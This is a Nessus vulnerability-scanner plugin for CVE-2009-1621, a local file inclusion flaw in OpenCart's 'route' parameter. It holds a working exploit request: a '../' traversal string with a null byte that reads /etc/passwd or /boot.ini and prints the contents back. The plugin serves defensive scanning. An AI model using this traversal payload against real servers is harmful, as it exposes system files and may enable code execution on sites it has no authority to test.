#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(38665);
  script_version("$Revision: 1.18 $");

  script_cve_id("CVE-2009-1621");
  script_bugtraq_id(34724);
  script_osvdb_id(54424);
  script_xref(name:"EDB-ID", value:"8539");
  script_xref(name:"Secunia", value:"34313 ");

  script_name(english:"OpenCart route Parameter Local File Inclusion");
  script_summary(english:"Tries to read a local file");

  script_set_attribute( attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
local file include vulnerability."  );
  script_set_attribute( attribute:"description",  value:
"The remote host is running OpenCart, an open source, PHP-based online
shopping cart system.

The version of OpenCart installed on the remote host fails to filter
user-supplied input to the 'route' parameter of the 'index.php' script
before using it to include PHP code in the 'execute' method in
'system/engine/front.php'.  Regardless of PHP's 'register_globals'
setting, an unauthenticated attacker can exploit this issue to view
arbitrary files or possibly to execute arbitrary PHP code on the
remote host, subject to the privileges of the web server user id."  );
  script_set_attribute( attribute:"solution",  value:
"The issue was silently fixed in OpenCart 1.1.9 so upgrade to at least
that version."  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"OpenCart 1.1.8 LFI");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
 script_cwe_id(22);
 script_set_attribute(attribute:"plugin_publication_date", value: "2009/05/03");
 script_cvs_date("$Date: 2016/05/20 14:21:42 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:opencart:opencart");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0, php: 1);

# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) file = '/boot.ini';
  else file = '/etc/passwd';
  files = make_list(file);
}
else files = make_list('/etc/passwd', '/boot.ini');

traversal = crap(data:"../", length:3*9) + '..';

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/boot.ini'] = "^ *\[boot loader\]";


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/opencart", "/shop", "/store", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Unless we're paranoid, make sure we're looking at OpenCart.
  if (report_paranoia < 2)
  {
    url = string(dir, "/index.php");
    res = http_get_cache(item:url, port:port, exit_on_fail: 1);

    if (
      ' (Powered By OpenCart)</title>' >!< res ||
      '>Powered By <a href="http://www.opencart.com">OpenCart<' >!< res
    ) continue;
  }

  # Loop through files to look for.
  foreach file (files)
  {
    url = string(
      dir, "/index.php?",
      # nb: the app *requires* magic_quotes_gpc to be off; ie, see 
      #     'system/startup.php'.
      "route=", string(traversal, file, "%00")
    );

    # Try to exploit the issue.
    res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail: 1);

    # There's a problem if we see the expected contents.
    body = res[2];
    file_pat = file_pats[file];
    if (egrep(pattern:file_pat, string:body))
    {
      if (report_verbosity > 0)
      {
        if (os && "Windows" >< os) file = str_replace(find:'/', replace:'\\', string:file);

        report = string(
          "\n",
          "Nessus was able to exploit the issue to retrieve the contents of\n",
          "'", file, "' on the remote host using the following URL :\n",
          "\n",
          "  ", build_url(port:port, qs:url), "\n"
        );
        if (report_verbosity > 1)
        {
          report += string(
            "\n",
            "Here are its contents :\n",
            "\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
            body,
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
          );
        }
        security_warning(port:port, extra:report);
      }
      else security_warning(port);

      exit(0);
    }
  }
}
